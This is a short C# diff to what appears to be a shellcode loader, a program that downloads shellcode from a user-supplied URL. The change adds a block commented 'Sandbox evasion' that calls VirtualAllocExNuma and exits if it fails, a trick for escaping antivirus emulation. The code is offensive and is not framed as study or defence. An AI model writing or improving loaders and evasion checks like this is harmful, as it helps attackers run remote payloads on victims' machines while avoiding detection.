@@ -16,6 +16,14 @@ namespace CreateThread
             {
                 throw new ApplicationException("Specify the URL of the shellcode to retrieve.");
             }
+
+            // Sandbox evasion
+            IntPtr mem = Win32.VirtualAllocExNuma(Win32.GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
+            {
+                return;
+            }
+
             var client = new WebClient();
 
             // Add a user agent header in case the requested URI contains a query.
